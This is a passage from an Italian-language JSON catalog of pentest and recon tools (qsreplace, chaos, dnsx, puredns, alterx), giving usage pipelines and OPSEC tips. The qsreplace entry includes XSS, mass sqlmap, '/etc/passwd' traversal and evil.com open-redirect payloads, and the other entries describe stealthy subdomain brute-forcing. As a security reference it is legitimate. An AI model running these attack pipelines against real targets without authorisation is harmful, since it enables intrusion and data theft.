    "id": "qsreplace",
    "name": "qsreplace",
    "version": "latest",
    "icon": "../app/icons/github.svg",
    "installation": "Go",
    "repo": "https://github.com/tomnomnom/qsreplace",
    "desc": "Utility per sostituire i valori dei query string parameter negli URL con un valore custom.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p><strong>Qsreplace</strong> è una utility Unix-style essenziale nel toolkit di ogni bug bounty hunter e penetration tester, creata da tomnomnom. La sua funzione è semplice ma fondamentale: prende URL da stdin e sostituisce tutti i valori dei query string parameter con un valore specificato, producendo output su stdout. Questa operazione apparentemente banale è il collante che permette di connettere tool di reconnaissance (gau, waybackurls, hakrawler) con tool di vulnerability testing (nuclei, dalfox, sqlmap).</p><p>Il tool implementa anche deduplicazione intelligente: URL con la stessa combinazione host+path+parametri vengono emesse una sola volta, anche se i valori originali erano diversi. Questo riduce drasticamente il numero di test necessari quando si lavora con archivi storici che contengono migliaia di varianti della stessa URL. La modalità append permette di aggiungere payload ai valori esistenti invece di sostituirli, utile per injection che richiedono un prefisso valido.</p><br><hr><h4 class=\"rt-purple\">Funzionalità principali</h4><p><strong>Value Replacement:</strong> Sostituisce il valore di ogni parametro query string con la stringa specificata. Input: <code>site.com/page?id=123&amp;name=test</code> → Output: <code>site.com/page?id=PAYLOAD&amp;name=PAYLOAD</code></p><p><strong>Append Mode:</strong> Con <code>-a</code>, appende il payload al valore esistente invece di sostituirlo. Utile per SQL injection dove il valore originale deve essere preservato: <code>id=123</code> → <code>id=123'</code></p><p><strong>Smart Deduplication:</strong> Elimina automaticamente URL duplicate basandosi su host+path+set di parametri, non sui valori. Evita di testare la stessa injection point migliaia di volte.</p><p><strong>Unix Philosophy:</strong> Fa una cosa sola e la fa bene. Stdin/stdout per composizione con altri tool tramite pipe.</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><pre><code># === OPERAZIONI BASE ===\n# Sostituisci tutti i valori con marker FUZZ\ncat urls.txt | qsreplace 'FUZZ'\n# Input:  https://target.com/search?q=test&amp;page=1\n# Output: https://target.com/search?q=FUZZ&amp;page=FUZZ\n\n# Append invece di sostituire (per SQLi)\ncat urls.txt | qsreplace -a \"'\"\n# Input:  https://target.com/user?id=123\n# Output: https://target.com/user?id=123'\n\n# === PIPELINE VULNERABILITY TESTING ===\n# XSS testing: gau -&gt; dedup -&gt; replace -&gt; dalfox\ngau target.com | grep \"=\" | qsreplace '\"&gt;&lt;script&gt;alert(1)&lt;/script&gt;' | \\\n  dalfox pipe --silence --only-poc -o xss_vulns.txt\n\n# SQLi testing: prepara URL per sqlmap batch\ncat urls.txt | qsreplace 'FUZZ' | sort -u &gt; sqlmap_targets.txt\nwhile read url; do\n  sqlmap -u \"$url\" --batch --dbs --random-agent\ndone &lt; sqlmap_targets.txt\n\n# SSRF testing con collaborator/webhook\ngau target.com | grep \"=\" | qsreplace 'https://webhook.site/YOUR-ID' | \\\n  xargs -P 20 -I {} curl -sk {} &amp;&gt;/dev/null\n\n# === WORKFLOW COMPLETI ===\n# Recon completa -&gt; parameter testing\nsubfinder -d target.com -silent | httpx -silent | \\\n  katana -silent | grep \"=\" | uro | qsreplace 'FUZZ' | \\\n  nuclei -t fuzzing/ -o fuzz_results.txt\n\n# LFI testing massivo\ncat urls.txt | qsreplace '../../../etc/passwd' | \\\n  xargs -P 10 -I {} sh -c 'curl -sk \"{}\" | grep -q \"root:\" &amp;&amp; echo \"[VULN] {}\"'\n\n# Open redirect testing\ngau target.com | grep -E \"(url|redirect|next|return|goto)=\" | \\\n  qsreplace 'https://evil.com' | xargs -P 10 -I {} curl -skIL {} | \\\n  grep -i \"location.*evil.com\"\n\n# === COMBINAZIONE CON ALTRI TOOL ===\n# Prepara URL per ffuf parameter fuzzing\ncat urls.txt | qsreplace 'FUZZ' | head -1 &gt; fuzz_template.txt\nffuf -w wordlist.txt -u \"$(cat fuzz_template.txt)\" -mc 200,302\n\n# Nuclei fuzzing templates\ncat urls.txt | qsreplace 'FUZZ' | nuclei -t fuzzing/ -fuzz -o results.txt\n\n# === DEDUPLICAZIONE ===\n# Mostra effetto deduplicazione\necho -e \"site.com/a?id=1\\nsite.com/a?id=2\\nsite.com/a?id=3\" | qsreplace 'X'\n# Output: site.com/a?id=X (solo una volta!)\n\n# Combina con uro per max deduplicazione\ngau target.com | uro | qsreplace 'FUZZ' | wc -l  # molto meno URL</code></pre><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><ul><li><strong>Injection Point Preparation:</strong> Trasforma URL storiche da gau/waybackurls in target pronti per injection testing. Il marker FUZZ indica dove inserire payload.</li><li><strong>Mass Vulnerability Testing:</strong> Permette di testare centinaia di endpoint rapidamente con payload statici (XSS probe, SQLi quote, path traversal).</li><li><strong>Fuzzing Setup:</strong> Prepara URL template per tool come ffuf o nuclei fuzzing mode che richiedono placeholder espliciti.</li><li><strong>SSRF/Open Redirect Discovery:</strong> Sostituisce parametri URL-like con callback server per identificare vulnerabilità di redirect e SSRF.</li><li><strong>Deduplication Layer:</strong> Riduce drammaticamente il numero di test eliminando URL che differiscono solo per valore dei parametri.</li></ul><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><ul><li><strong>Tool Locale:</strong> Qsreplace stesso non genera traffico di rete - opera esclusivamente su stdin/stdout.</li><li><strong>Downstream Traffic:</strong> I payload inseriti causano traffico quando le URL generate vengono effettivamente testate. I payload malevoli nei log sono tracciabili.</li><li><strong>Encoding:</strong> Non esegue URL encoding automatico. Payload con caratteri speciali potrebbero richiedere encoding manuale prima dell'uso.</li></ul><br><hr>",
    "best_in": false,
    "category_path": [
      "06_Miscellaneous",
      "Utilities"
    ],
    "notes": null
  },
  {
    "id": "projectdiscovery-chaos",
    "name": "chaos",
    "version": "latest",
    "icon": "../app/icons/github.svg",
    "installation": "Go",
    "repo": "https://github.com/projectdiscovery/chaos-client",
    "desc": "Client CLI per Chaos Dataset API di ProjectDiscovery per subdomain enumeration passiva.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p><strong>Chaos</strong> Client è il client CLI ufficiale per accedere al Chaos Dataset di ProjectDiscovery, uno dei più grandi database pubblici di subdomain al mondo. Il dataset viene popolato continuamente da scansioni automatizzate dell'infrastruttura ProjectDiscovery e contiene centinaia di milioni di subdomain raccolti passivamente da programmi bug bounty, Fortune 500 e domini popolari. A differenza di tool attivi come subfinder, Chaos non genera alcun traffico verso il target: le query vengono eseguite esclusivamente contro l'API ProjectDiscovery.</p><p>Questo approccio completamente passivo è invaluable in scenari dove la stealth è critica o come primo step di reconnaissance per avere immediatamente una baseline di subdomain noti prima di procedere con enumerazione attiva. Il dataset copre oltre 40 milioni di programmi bug bounty e viene aggiornato quotidianamente. L'accesso richiede una API key gratuita ottenibile registrandosi su cloud.projectdiscovery.io.</p><br><hr><h4 class=\"rt-purple\">Funzionalità principali</h4><p><strong>Massive Dataset Access:</strong> Accesso a centinaia di milioni di subdomain pre-raccolti. Per domini popolari, il dataset può contenere migliaia di subdomain che richiederebbero giorni di brute-force per essere scoperti attivamente.</p><p><strong>Zero Target Interaction:</strong> Tutte le query sono verso l'API Chaos. Il target non riceve alcun traffico, rendendo l'operazione completamente invisibile.</p><p><strong>Statistics &amp; Analytics:</strong> Il comando <code>-stats</code> mostra metriche sul dataset: numero totale di domini tracciati, subdomain per dominio, data ultimo aggiornamento.</p><p><strong>Batch Processing:</strong> Elabora liste di domini in batch, ideale per valutare l'attack surface di organizzazioni con molti asset.</p><p><strong>Integration Ready:</strong> Output plain text o JSON per facile integrazione con altri tool dell'ecosistema ProjectDiscovery (httpx, nuclei, subfinder).</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><pre><code># === SETUP INIZIALE ===\n# Configura API key (ottenere da cloud.projectdiscovery.io)\nexport PDCP_API_KEY=\"your-api-key-here\"\n# Oppure salva in ~/.config/pdcp/config.yaml\n\n# === QUERY BASE ===\n# Subdomain per singolo dominio\nchaos -d target.com\n\n# Con output su file\nchaos -d target.com -o target_subdomains.txt\n\n# Output JSON per parsing\nchaos -d target.com -json | jq '.subdomains[]' -r\n\n# === BATCH PROCESSING ===\n# Query multipli domini (bug bounty multi-scope)\ncat scope_domains.txt | chaos -o all_subdomains.txt\n\n# Con file input esplicito\nchaos -dL domains.txt -o batch_results.txt\n\n# === STATISTICHE ===\n# Visualizza statistiche dataset\nchaos -d target.com -count\n# Output: target.com has 1,234 subdomains\n\n# Lista programmi bug bounty indicizzati\nchaos -ls\n\n# === PIPELINE RECON ===\n# Workflow passivo completo: chaos -&gt; httpx -&gt; nuclei\nchaos -d target.com -silent | httpx -silent | \\\n  nuclei -t exposures/ -t cves/ -severity high,critical -o vulns.txt\n\n# Combina con subfinder per max coverage\n(chaos -d target.com -silent; subfinder -d target.com -silent) | \\\n  sort -u | httpx -silent &gt; live_hosts.txt\n\n# === CONFRONTO PRE/POST ===\n# Salva baseline iniziale\nchaos -d target.com -o baseline_$(date +%Y%m%d).txt\n\n# Dopo N giorni, confronta per nuovi subdomain\nchaos -d target.com -o current.txt\ncomm -23 &lt;(sort current.txt) &lt;(sort baseline_*.txt) &gt; new_subdomains.txt\n\n# === OUTPUT FORMATTATO ===\n# Solo hostname senza protocollo\nchaos -d target.com -silent | sed 's/^/https:\\/\\//' | httpx -silent\n\n# Filtra per pattern (es. staging, dev)\nchaos -d target.com -silent | grep -E \"(stag|dev|test|uat)\"\n\n# === VERIFICA COVERAGE ===\n# Controlla se un dominio è nel dataset\nchaos -d smallcompany.com -count\n# Se 0, il dominio non è tracciato - usa solo tool attivi</code></pre><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><ul><li><strong>Stealth Reconnaissance:</strong> Prima fase di recon in engagement dove ogni pacchetto verso il target deve essere giustificato. Zero footprint sul target.</li><li><strong>Bug Bounty Quick Start:</strong> Prima di investire tempo in enumerazione attiva, controlla cosa è già noto. Spesso il dataset Chaos contiene già centinaia di subdomain per programmi popolari.</li><li><strong>Attack Surface Baseline:</strong> Stabilisce una baseline di asset noti per confronto futuro. Utile per monitorare l'espansione dell'infrastruttura di un target.</li><li><strong>Scope Validation:</strong> Verifica rapidamente quali asset di un'organizzazione sono pubblicamente noti e potrebbero essere in-scope per un engagement.</li><li><strong>Red Team Preparation:</strong> Raccoglie intelligence passiva prima di engagement attivi, riducendo il rumore iniziale.</li></ul><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><ul><li><strong>Zero Target Footprint:</strong> Completamente passivo verso il target. Nessun pacchetto, nessun log, nessun alert.</li><li><strong>API Provider Visibility:</strong> ProjectDiscovery vede le query. Per engagement sensibili, considerare che le query potrebbero essere loggate.</li><li><strong>Dataset Freshness:</strong> I dati potrebbero non essere aggiornati al minuto. Subdomain molto recenti potrebbero non essere ancora indicizzati.</li><li><strong>Coverage Variabile:</strong> Domini piccoli o nuovi potrebbero non essere nel dataset. Sempre combinare con enumerazione attiva per completezza.</li></ul><br><hr>",
    "best_in": false,
    "category_path": [
      "01_Information_Gathering",
      "Recon",
      "Infrastructure",
      "DNS_Subdomains"
    ],
    "notes": null
  },
  {
    "id": "projectdiscovery-dnsx",
    "name": "dnsx",
    "version": "latest",
    "icon": "../app/icons/github.svg",
    "installation": "Go",
    "repo": "https://github.com/projectdiscovery/dnsx",
    "desc": "Toolkit DNS multi-purpose per risoluzione, brute-force e validazione con supporto wildcard detection.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p><strong>dnsx</strong> è il toolkit DNS definitivo di ProjectDiscovery, costruito sulla libreria retryabledns per massima affidabilità e performance. Progettato per operazioni di reconnaissance su larga scala, combina risoluzione DNS veloce con funzionalità avanzate come wildcard filtering, multi-query support per tutti i record type, e brute-force con wordlist. È il tool di riferimento per validare e arricchire liste di subdomain generate da altri tool.</p><p>La sua architettura supporta resolver multipli (UDP, TCP, DoH, DoT) con automatic retry e failover, garantendo risultati affidabili anche con liste di milioni di hostname. Il wildcard detection multi-livello elimina automaticamente i falsi positivi che affliggono altri resolver, mentre l'output strutturato permette estrazione di IP, CNAME, nameserver e altri record per analisi successive. È il ponte tra subdomain enumeration e port scanning.</p><br><hr><h4 class=\"rt-purple\">Funzionalità principali</h4><p><strong>Multi-Record Type Support:</strong> Query per A, AAAA, CNAME, NS, MX, TXT, SRV, SOA, PTR, CAA, AXFR, ANY e modalità recon che estrae tutti i tipi in una volta sola.</p><p><strong>Wildcard Detection Avanzato:</strong> Sistema multi-livello che identifica e filtra DNS wildcard (domini che rispondono a qualsiasi query) prevenendo migliaia di falsi positivi nelle enumerazioni.</p><p><strong>Brute-Force Integrato:</strong> Supporto nativo per subdomain brute-forcing con wordlist, incluso placeholder FUZZ per pattern matching dinamico come <code>FUZZ.target.com</code>.</p><p><strong>Resolver Flexibility:</strong> Usa resolver di sistema, lista custom, o specifici protocolli (DNS-over-HTTPS con Cloudflare/Google, DNS-over-TLS). Automatic retry con backoff e failover tra resolver.</p><p><strong>Rich Output:</strong> Oltre al semplice hostname, può emettere response code, TTL, IP address, CNAME target, e raw response per analisi dettagliata.</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><pre><code># === RISOLUZIONE BASE ===\n# Risolvi singolo hostname\necho \"api.target.com\" | dnsx\n\n# Risolvi lista di subdomain (output: hostname che risolvono)\ncat subdomains.txt | dnsx -silent -o resolved.txt\n\n# Con response IP incluso\ncat subdomains.txt | dnsx -a -resp\n# Output: api.target.com [1.2.3.4]\n\n# === RECORD TYPE SPECIFICI ===\n# Estrai CNAME per identificare CDN/terze parti\ncat subdomains.txt | dnsx -cname -resp\n# Output: cdn.target.com [d111111abcdef8.cloudfront.net]\n\n# Estrai MX per mail server\necho \"target.com\" | dnsx -mx -resp\n\n# Estrai TXT per SPF, DKIM, verifications\necho \"target.com\" | dnsx -txt -resp\n\n# Recon mode: tutti i record types\necho \"target.com\" | dnsx -recon -resp-only\n\n# === SUBDOMAIN BRUTE-FORCE ===\n# Brute-force con wordlist\ndnsx -d target.com -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt\n\n# Con pattern FUZZ per nomenclature specifiche\ndnsx -d target.com -w words.txt -wp \"FUZZ-api.FUZZ\"\n# Testa: dev-api.dev, staging-api.staging, etc.\n\n# === WILDCARD HANDLING ===\n# Abilita wildcard filtering esplicito\ncat subdomains.txt | dnsx -wd target.com\n\n# Test se dominio ha wildcard\necho \"randomnonexistent12345.target.com\" | dnsx -a -resp\n# Se risolve, wildcard è attivo\n\n# === RESOLVER AVANZATI ===\n# Usa resolver custom (file con IP:porta)\ncat subdomains.txt | dnsx -r resolvers.txt -a -resp\n\n# DNS-over-HTTPS (Cloudflare)\ncat subdomains.txt | dnsx -doh-url https://cloudflare-dns.com/dns-query\n\n# Con retry e timeout custom\ncat subdomains.txt | dnsx -retry 3 -t 5 -a -resp\n\n# === PIPELINE RECON ===\n# Workflow completo: subfinder -&gt; dnsx validate -&gt; extract IPs -&gt; nmap\nsubfinder -d target.com -silent | dnsx -a -resp-only | \\\n  sort -u | tee ips.txt | nmap -iL - -sV -oN scan.txt\n\n# Validazione + probe HTTP\ncat all_subdomains.txt | dnsx -silent | httpx -silent | nuclei -t cves/\n\n# Estrai provider (CDN, Cloud) da CNAME\ncat subdomains.txt | dnsx -cname -resp | grep -E \"(cloudfront|akamai|fastly|azure|aws)\"\n\n# === REVERSE DNS ===\n# PTR lookup per range IP\necho \"1.2.3.4\" | dnsx -ptr -resp\n\n# Da CIDR a hostname\nprips 192.168.1.0/24 | dnsx -ptr -resp-only | grep target.com\n\n# === OUTPUT FORMATTATO ===\n# JSON per parsing programmatico\ncat subdomains.txt | dnsx -a -resp -json -o results.json\n\n# Solo IP (per nmap input)\ncat subdomains.txt | dnsx -a -resp-only -silent &gt; ips.txt</code></pre><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><ul><li><strong>Subdomain Validation:</strong> Dopo enumeration con subfinder/amass, valida quali hostname risolvono effettivamente. Elimina subdomain morti prima di scanning HTTP.</li><li><strong>IP Extraction:</strong> Estrae gli indirizzi IP per costruire target list per port scanning con nmap/masscan. Identifica se più subdomain puntano allo stesso IP (virtual hosting).</li><li><strong>Infrastructure Mapping:</strong> CNAME resolution rivela dipendenze da CDN (CloudFront, Akamai), cloud provider (AWS, Azure, GCP), e servizi terzi potenzialmente vulnerabili a takeover.</li><li><strong>Brute-Force Enumeration:</strong> Alternativa a massdns/shuffledns quando serve integrazione stretta con workflow ProjectDiscovery.</li><li><strong>Reverse DNS Recon:</strong> Da IP noti (es. da certificate transparency) trova hostname associati che potrebbero essere fuori scope apparente ma collegati al target.</li></ul><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><ul><li><strong>DNS Query Logging:</strong> Le query DNS sono visibili ai resolver utilizzati. ISP e corporate DNS loggano le richieste.</li><li><strong>Resolver Choice:</strong> Per anonimato, usare resolver pubblici (8.8.8.8, 1.1.1.1) invece del DNS aziendale. Per stealth totale, usare DoH/DoT.</li><li><strong>Traffic Volume:</strong> Brute-force genera migliaia di query. Rate limiting e distribuzione tra resolver prevengono blocchi.</li><li><strong>Authoritative NS Detection:</strong> I nameserver autoritativi del target vedono tutte le query. Considerare se questo traffico è accettabile nell'engagement.</li></ul><br><hr>",
    "best_in": false,
    "category_path": [
      "01_Information_Gathering",
      "Recon",
      "Infrastructure",
      "DNS_Subdomains"
    ],
    "notes": null
  },
  {
    "id": "puredns",
    "name": "puredns",
    "version": "latest",
    "icon": "../app/icons/github.svg",
    "installation": "Go",
    "repo": "https://github.com/d3mondev/puredns",
    "desc": "Tool per DNS resolution e subdomain brute-force veloce con filtering wildcard e validazione.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p><strong>Puredns</strong> è il tool di riferimento per subdomain enumeration su larga scala, combinando la velocità raw di massdns con un layer di intelligence che elimina i falsi positivi che affliggono altri resolver. Il suo algoritmo proprietario di wildcard detection e la validazione multi-fase producono risultati puliti e affidabili anche su domini con configurazioni DNS complesse o abusate da wildcard.</p><p>L'architettura opera in tre fasi distinte: prima esegue mass resolution tramite massdns con resolver pubblici distribuiti geograficamente, poi applica wildcard filtering che analizza pattern di risposta per identificare e rimuovere falsi positivi, infine valida i risultati con resolver trusted (Google DNS 8.8.8.8) per eliminare eventuali DNS poisoning o risposte corrotte. Questo approccio a tre livelli garantisce che ogni subdomain nell'output finale sia realmente esistente e raggiungibile.</p><br><hr><h4 class=\"rt-purple\">Funzionalità principali</h4><p><strong>Dual Operation Mode:</strong> <code>bruteforce</code> per generare e testare subdomain da wordlist, <code>resolve</code> per validare liste pre-esistenti da altri tool. Entrambi beneficiano dello stesso filtering avanzato.</p><p><strong>Wildcard Detection Multi-Level:</strong> Algoritmo che identifica wildcard DNS non solo al livello base (*.domain.com) ma anche a livelli multipli (*.sub.domain.com), un problema che causa milioni di falsi positivi in altri tool.</p><p><strong>Trusted Validation:</strong> Fase finale che ri-testa tutti i risultati positivi con Google DNS, eliminando risposte fraudolente da resolver compromessi o con cache poisoning.</p><p><strong>Massdns Integration:</strong> Sfrutta massdns come engine per query massivamente parallele (100k+ query/secondo su hardware adeguato), ma aggiunge l'intelligence mancante.</p><p><strong>Resolver Management:</strong> Testa automaticamente i resolver per affidabilità e rimuove quelli che producono risposte inconsistenti o lente.</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><pre><code># === PREREQUISITI ===\n# Puredns richiede massdns installato\n# Su Kali: apt install massdns\n# Serve anche una lista di resolver pubblici affidabili\n\n# === SUBDOMAIN BRUTE-FORCE ===\n# Brute-force base con wordlist\npuredns bruteforce /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt target.com\n\n# Con resolver custom e output file\npuredns bruteforce wordlist.txt target.com -r resolvers.txt -w found.txt\n\n# Wordlist massiva con rate limiting (evita blocchi resolver)\npuredns bruteforce subdomains-top1million-110000.txt target.com \\\n  -r resolvers.txt -l 5000 --wildcard-batch 1000000\n\n# === RESOLVE MODE ===\n# Valida lista da subfinder/amass\nsubfinder -d target.com -silent | puredns resolve -w valid.txt\n\n# Resolve con output dettagliato\npuredns resolve subdomains.txt -r resolvers.txt -w resolved.txt --write-wildcards wildcards.txt\n\n# === WILDCARD HANDLING ===\n# Mostra wildcard trovati (per debug)\npuredns bruteforce wordlist.txt target.com -r resolvers.txt --print-wildcards\n\n# Salta wildcard detection (se sei sicuro non ci siano)\npuredns resolve subdomains.txt --skip-wildcard-filter\n\n# === PIPELINE RECON ===\n# Workflow completo: passivo -&gt; brute -&gt; merge -&gt; probe\nsubfinder -d target.com -silent &gt; passive.txt\npuredns bruteforce wordlist.txt target.com -r resolvers.txt -w bruteforce.txt\ncat passive.txt bruteforce.txt | sort -u | puredns resolve -w final.txt\ncat final.txt | httpx -silent | nuclei -t cves/ -o vulns.txt\n\n# Massivo multi-dominio\ncat scope_domains.txt | while read domain; do\n  echo \"[*] Bruteforcing $domain\"\n  puredns bruteforce wordlist.txt \"$domain\" -r resolvers.txt -w \"${domain}_subs.txt\" -q\ndone\n\n# === OTTIMIZZAZIONE PERFORMANCE ===\n# Alta velocità con molti resolver\npuredns bruteforce wordlist.txt target.com -r 1000_resolvers.txt \\\n  --bin $(which massdns) -l 10000\n\n# Bilanciamento accuratezza/velocità\npuredns bruteforce wordlist.txt target.com \\\n  --wildcard-tests 10 --wildcard-batch 500000\n\n# === INTEGRAZIONE ALTERX ===\n# Genera permutazioni -&gt; resolve con puredns\necho \"api.target.com\" | alterx -enrich | puredns resolve -w permuted_valid.txt\n\n# === OUTPUT ANALYSIS ===\n# Estrai statistiche\nwc -l found.txt\ncat found.txt | rev | cut -d. -f1-2 | rev | sort | uniq -c | sort -rn  # TLD distribution</code></pre><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><ul><li><strong>Large-Scale Enumeration:</strong> Brute-force con wordlist da milioni di entry su organizzazioni enterprise. Il wildcard filtering previene output inquinato da falsi positivi.</li><li><strong>Result Validation:</strong> Dopo enumeration passiva con subfinder/amass, valida che i subdomain trovati siano effettivamente live e non stale data.</li><li><strong>Bug Bounty Automation:</strong> Integrato in pipeline automatizzate per scansione continua di scope, identifica rapidamente nuovi subdomain man mano che vengono deployati.</li><li><strong>Resolver Quality Check:</strong> L'analisi automatica dei resolver identifica quelli problematici, utile per costruire liste di resolver affidabili.</li><li><strong>Baseline Establishment:</strong> Crea snapshot completi dell'infrastruttura DNS per confronto futuro e change detection.</li></ul><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><ul><li><strong>DNS Traffic Volume:</strong> Il brute-force genera un volume enorme di query DNS. I nameserver autoritativi del target vedono ogni singola query.</li><li><strong>Resolver Logging:</strong> I resolver pubblici utilizzati loggano le richieste. Per operazioni sensibili, considerare resolver privati.</li><li><strong>Rate Limiting:</strong> Senza <code>-l</code> appropriato, alcuni resolver potrebbero bloccare le query. Distribuire il carico su molti resolver.</li><li><strong>Massdns Dependency:</strong> Richiede massdns installato. Verificare che sia presente e nel PATH prima dell'uso.</li></ul><br><hr>",
    "best_in": false,
    "category_path": [
      "01_Information_Gathering",
      "Recon",
      "Infrastructure",
      "DNS_Subdomains"
    ],
    "notes": null
  },
  {
    "id": "projectdiscovery-alterx",
    "name": "alterx",
    "version": "latest",
    "icon": "../app/icons/github.svg",
    "installation": "Go",
    "repo": "https://github.com/projectdiscovery/alterx",
    "desc": "Generatore di wordlist per subdomain basato su pattern DSL per permutazioni intelligenti.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p><strong>AlterX</strong> di ProjectDiscovery è un generatore di wordlist per subdomain di nuova generazione che utilizza un Domain Specific Language (DSL) per creare permutazioni intelligenti. A differenza di tool legacy come altdns che applicano pattern statici predefiniti, AlterX analizza i subdomain in input per scoprire automaticamente le naming convention specifiche del target, generando permutazioni che hanno alta probabilità di esistere perché seguono la stessa logica già usata dall'organizzazione.</p><p>Il DSL permette di definire template sofisticati con variabili come {{word}}, {{sub}}, {{suffix}}, {{number}} e operatori per combinazioni, increment e mutation. La modalità \"enrich\" analizza automaticamente i subdomain forniti, estrae pattern comuni (prefissi numerati, suffissi ambiente, separatori usati) e arricchisce il vocabolario con parole estratte dai nomi esistenti. Il risultato è una wordlist mirata che può scoprire in poche migliaia di entry ciò che richiederebbe milioni di tentativi con wordlist generiche.</p><br><hr><h4 class=\"rt-purple\">Funzionalità principali</h4><p><strong>Intelligent Pattern DSL:</strong> Linguaggio espressivo per definire template di permutazione. Supporta variabili ({{sub}}, {{word}}, {{number}}, {{suffix}}), operatori di mutazione (case change, separator swap), e combinatori per generare varianti multiple.</p><p><strong>Auto Pattern Mining:</strong> La modalità <code>-enrich</code> analizza i subdomain input per scoprire pattern: identifica prefissi/suffissi comuni (dev-, -api, -staging), sequenze numeriche (server1, server2), separatori usati (dash, underscore, dot).</p><p><strong>Word Extraction:</strong> Estrae automaticamente \"words\" significative dai subdomain esistenti e le usa come base per permutazioni. Se esiste \"billing-api.target.com\", estrae \"billing\" e \"api\" per generare combinazioni.</p><p><strong>Payload Templates:</strong> Template predefiniti per scenari comuni (environment permutations, numeric sequences, service discovery) che possono essere combinati con pattern custom.</p><p><strong>Limit Controls:</strong> Controllo preciso sulla dimensione output con <code>-limit</code> per evitare wordlist esplosive quando i pattern combinati producono milioni di entry.</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><pre><code># === GENERAZIONE BASE ===\n# Genera permutazioni default da singolo subdomain\necho \"api.target.com\" | alterx\n# Output: api-dev.target.com, api-staging.target.com, api1.target.com, etc.\n\n# Da lista di subdomain noti\ncat known_subdomains.txt | alterx -o permutations.txt\n\n# === PATTERN CUSTOM ===\n# Pattern specifico: word-environment.domain\necho \"api.target.com\" | alterx -p '{{word}}-dev.{{root}}'\necho \"api.target.com\" | alterx -p '{{word}}-staging.{{root}}'\necho \"api.target.com\" | alterx -p '{{word}}-uat.{{root}}'\n\n# Sequenze numeriche\necho \"server.target.com\" | alterx -p '{{word}}{{number}}.{{root}}'\n# Output: server1.target.com, server2.target.com, ...\n\n# Combinazione prefisso + suffisso\necho \"api.target.com\" | alterx -p 'internal-{{sub}}.{{root}}' -p '{{sub}}-internal.{{root}}'\n\n# === ENRICHMENT MODE ===\n# Auto-discovery pattern (modalità più potente)\ncat subdomains.txt | alterx -enrich -o enriched_wordlist.txt\n\n# Enrich con limite output\ncat subdomains.txt | alterx -enrich -limit 50000 -o wordlist.txt\n\n# === PATTERN AVANZATI ===\n# Multi-level subdomain\necho \"api.prod.target.com\" | alterx -p '{{word}}.dev.{{root}}'\n\n# Variazioni separatori\necho \"api-server.target.com\" | alterx -p '{{word}}_server.{{root}}' -p '{{word}}.server.{{root}}'\n\n# Combinazioni multiple\necho \"app.target.com\" | alterx -p '{{word}}-{{number}}.{{root}}' \\\n  -en num-count=10  # genera app-1 fino a app-10\n\n# === PIPELINE COMPLETA ===\n# Workflow: passive -&gt; enrich -&gt; resolve -&gt; probe\nsubfinder -d target.com -silent | tee passive.txt | \\\n  alterx -enrich -limit 100000 | \\\n  puredns resolve -r resolvers.txt | \\\n  httpx -silent | nuclei -t cves/\n\n# Generate + resolve immediate\ncat known.txt | alterx -enrich | dnsx -silent -o new_found.txt\n\n# === PATTERN SPECIFICI PER SCENARI ===\n# DevOps environments\ncat subdomains.txt | alterx -p '{{word}}-dev.{{root}}' \\\n  -p '{{word}}-stage.{{root}}' -p '{{word}}-prod.{{root}}' \\\n  -p '{{word}}-test.{{root}}' -p '{{word}}-qa.{{root}}'\n\n# Cloud regions\ncat subdomains.txt | alterx -p '{{word}}-us-east-1.{{root}}' \\\n  -p '{{word}}-eu-west-1.{{root}}' -p '{{word}}-ap-southeast-1.{{root}}'\n\n# Versioning\ncat subdomains.txt | alterx -p '{{word}}-v1.{{root}}' \\\n  -p '{{word}}-v2.{{root}}' -p '{{word}}-beta.{{root}}'\n\n# === OUTPUT ANALYSIS ===\n# Conta permutazioni generate\ncat known.txt | alterx -enrich | wc -l\n\n# Preview senza salvare\necho \"api.target.com\" | alterx -p '{{word}}-{{number}}.{{root}}' | head -20</code></pre><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><ul><li><strong>Targeted Brute-Force:</strong> Genera wordlist specifiche per il target invece di usare liste generiche da milioni di entry. Maggiore probabilità di successo con meno query.</li><li><strong>Pattern Exploitation:</strong> Quando scopri che un target usa naming convention specifiche (es. service-env-region), AlterX genera tutte le combinazioni possibili di quel pattern.</li><li><strong>Environment Discovery:</strong> Trova ambienti dev/staging/test che usano gli stessi nomi dei servizi production ma con prefissi/suffissi diversi.</li><li><strong>Numeric Sequence Enumeration:</strong> Scopre server numerati (db1, db2, db3...) che spesso esistono in infrastrutture di una certa scala.</li><li><strong>Wordlist Optimization:</strong> Riduce wordlist massive a subset mirati basati sui pattern realmente usati dal target.</li></ul><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><ul><li><strong>Zero Network Activity:</strong> AlterX è completamente offline - genera solo wordlist senza effettuare query di rete.</li><li><strong>Output Size Control:</strong> Senza <code>-limit</code>, combinazioni di pattern possono generare milioni di entry. Sempre verificare la dimensione output prima di usarla in resolution.</li><li><strong>Quality over Quantity:</strong> Wordlist mirate sono più efficaci di liste enormi. Preferire pattern specifici a combinazioni esplosive.</li></ul><br><hr>",
    "best_in": false,
    "category_path": [
      "01_Information_Gathering",
      "Recon",
      "Infrastructure",
      "DNS_Subdomains"
    ],
    "notes": null
  },
  {
    "id": "projectdiscovery-shuffledns",
    "name": "shuffledns",
    "version": "latest",
    "icon": "../app/icons/github.svg",
    "installation": "Go",
    "repo": "https://github.com/projectdiscovery/shuffledns",
    "desc": "Wrapper massdns per subdomain brute-force e resolution con wildcard filtering automatico.",
